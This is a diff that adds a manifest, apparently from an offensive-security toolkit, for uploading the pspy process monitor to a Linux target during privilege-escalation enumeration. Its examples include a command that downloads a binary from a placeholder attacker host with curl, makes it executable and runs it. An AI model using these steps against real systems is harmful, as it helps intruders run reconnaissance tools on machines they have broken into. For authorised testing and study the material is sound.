@@ -1,0 +1,32 @@
+schema = 1
+kind = "upload"
+description = "Process monitor for Linux that needs no root"
+tags = ["linux", "privesc", "enum", "processes"]
+upstream = "https://github.com/DominicBreuker/pspy"
+licence = "GPL-3.0"
+arch = "x86_64"
+examples = [
+  "python3 -m http.server 80",
+  "curl http://{lhost}/pspy64 -o pspy64 && chmod +x pspy64",
+  "./pspy64 -pf -i 1000",
+]
+
+[[upload]]
+path = "files/pspy64"
+as = "pspy64"
+note = "Linux x86_64, static"
+
+[[upload]]
+path = "files/pspy32"
+as = "pspy32"
+note = "Linux x86, static"
+
+[[upload]]
+path = "files/pspy64s"
+as = "pspy64s"
+note = "Linux x86_64, small"
+
+[[upload]]
+path = "files/pspy32s"
+as = "pspy32s"
+note = "Linux x86, small"
